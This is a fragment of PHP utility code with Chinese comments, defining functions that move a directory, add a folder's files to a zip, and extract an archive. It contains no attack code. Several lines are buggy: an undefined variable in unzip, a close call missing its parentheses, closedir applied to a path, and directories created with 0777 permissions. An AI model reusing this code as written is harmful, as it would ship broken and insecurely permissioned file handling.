function moveme_dir($from_dir,$to_dir){//移动目录本身及文件
     if (substr($to_dir,-1)=="/"){
       $to_dir=killlaststr($to_dir);
     }
     if (!is_dir($from_dir)){
        return false;
     }    
    $ptfrom=explode("/",$from_dir);
    $totpt=count($ptfrom);
    $lstpt=$ptfrom[$totpt-1];
    $to_dir=$to_dir."/".$lstpt;
    $from_files = scandir($from_dir);    
    if (!file_exists($to_dir)){        
      is_dir($to_dir) OR mkdir($to_dir, 0777, true); 
    }
    if (!empty($from_files)){
        foreach ($from_files as $file){
            if ($file == '.' || $file == '..' ){
                continue;
            }              
            if (is_dir($from_dir.'/'.$file)){//如果是目录，则调用自身
                copy_dir($from_dir.'/'.$file,$to_dir.'/'.$file);
            }else{//直接copy到目标文件夹
                copy($from_dir.'/'.$file,$to_dir.'/'.$file);
            }
        }
    }
  $z=deltree($from_dir);
  return true;
 }
function addFileToZip($path,$zip){
    $handler=opendir($path); //打开当前文件夹由$path指定。
    while(($filename=readdir($handler))!==false){
        if($filename != "." && $filename != ".."){//文件夹文件名字为'.'和‘..’，不要对他们进行操作
            if(is_dir($path."/".$filename)){// 如果读取的某个对象是文件夹，则递归
                addFileToZip($path."/".$filename, $zip);
            }else{ //将文件加入zip对象
                $zip->addFile($path."/".$filename);
            }
        }
    }
    @closedir($path);
}
function unzip($file,$outPath){
   if (substr($outpath,-1)=="/"){
     $outpath=killlaststr($outpath);
   }
   $zip = new ZipArchive;
   $openRes = $zip->open($file);
  if ($openRes === TRUE) {
    $zip->extractTo($outPath);
    $zip->close;
    //echo "opentrue-".$file."----to--".$outPath;
    return true;
  }else{
    return false;
  }
  
}

//CORE CODE END
?>
